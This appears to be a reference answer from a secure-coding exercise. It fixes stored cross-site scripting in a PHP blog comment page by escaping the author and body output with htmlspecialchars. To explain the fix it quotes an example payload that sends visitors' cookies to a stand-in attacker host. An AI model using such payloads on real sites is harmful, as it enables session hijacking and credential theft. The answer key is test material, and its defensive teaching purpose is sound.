## Reference solution

```php
// ------------------------------------------------------------------------
// ANSWER — Unescaped Comment HTML Output
// ------------------------------------------------------------------------

<?php
// public/blog/post.php

require_once __DIR__ . '/../../bootstrap.php';

$pdo = get_db_connection();
$post_id = (int) ($_GET['id'] ?? 0);

$stmt = $pdo->prepare("SELECT title, body FROM posts WHERE id = ?");
$stmt->execute([$post_id]);
$post = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$post) {
    http_response_code(404);
    echo "Post not found.";
    exit;
}

$stmt2 = $pdo->prepare(
    "SELECT author, body FROM comments WHERE post_id = ? ORDER BY created_at ASC"
);
$stmt2->execute([$post_id]);
$comments = $stmt2->fetchAll(PDO::FETCH_ASSOC);

echo "<h1>" . htmlspecialchars($post['title'], ENT_QUOTES, 'UTF-8') . "</h1>";
echo "<div class='post-body'>" . htmlspecialchars($post['body'], ENT_QUOTES, 'UTF-8') . "</div>";

echo "<h2>Comments</h2>";
foreach ($comments as $comment) {
    echo "<div class='comment'>";
    // CHANGE 1: wrap author in htmlspecialchars so injected markup is rendered as text, not executed HTML
    echo "<strong>" . htmlspecialchars($comment['author'], ENT_QUOTES, 'UTF-8') . "</strong>";
    // CHANGE 2: wrap body in htmlspecialchars so stored scripts/HTML in comment body cannot execute in the browser
    echo "<p>" . htmlspecialchars($comment['body'], ENT_QUOTES, 'UTF-8') . "</p>";
    echo "</div>";
}
```

## Explanation

### Issue 1: Unescaped comment author output

**Problem:** The `$comment['author']` value is echoed directly inside a `<strong>` tag with no encoding. An attacker who registers or submits a comment with an author name containing HTML (e.g., `</strong><script>…</script>`) will have that markup rendered verbatim in every visitor's browser, breaking page structure or executing scripts.

**Fix:** Replace the raw `$comment['author']` echo with `htmlspecialchars($comment['author'], ENT_QUOTES, 'UTF-8')`, matching the encoding already applied to the post title and body.

**Explanation:** PHP's `echo` writes its argument straight into the HTTP response body. When a browser receives a response with embedded `<script>` (or event-handler attributes like `onerror=`), it treats them as HTML markup and executes any JavaScript. The submission-side blocklist only strips the literal string `<script>`, so an attacker can bypass it with casing variations (`<Script>`) or alternative vectors (`<img onerror=…>`). `htmlspecialchars` converts `<`, `>`, `"`, `'`, and `&` into their HTML entity equivalents (`&lt;`, `&gt;`, etc.), so the browser displays the characters as text rather than parsing them as markup. `ENT_QUOTES` is required to also encode single quotes, which matter when the value lands inside an attribute delimited by single quotes — a common secondary injection point.

---

### Issue 2: Unescaped comment body output

**Problem:** The `$comment['body']` value is echoed directly inside a `<p>` tag. Any HTML or JavaScript stored in the `body` column — including the `<script>document.location=…</script>` the security team observed — renders and executes for every user who loads the page, enabling redirects, session hijacking, or credential theft.

**Fix:** Replace the raw `$comment['body']` echo with `htmlspecialchars($comment['body'], ENT_QUOTES, 'UTF-8')`, the same call added for the author field in CHANGE 1.

**Explanation:** The body field is the primary attack surface here: it accepts multi-line free text, giving an attacker far more room to craft payloads. Because the only server-side defense was a blocklist stripping `<script>`, any payload that avoids that exact string (such as `<img src=x onerror="document.location='https://evil.example/?c='+document.cookie">`) passes through to the database unchanged and then renders as live HTML on output. `htmlspecialchars` neutralises the payload at display time regardless of what was stored, which is the correct layer for output encoding — sanitising input is an unreliable primary defense because blocklists are incomplete and context-dependent. After this fix, the stored string is displayed as visible text characters, not interpreted as markup.
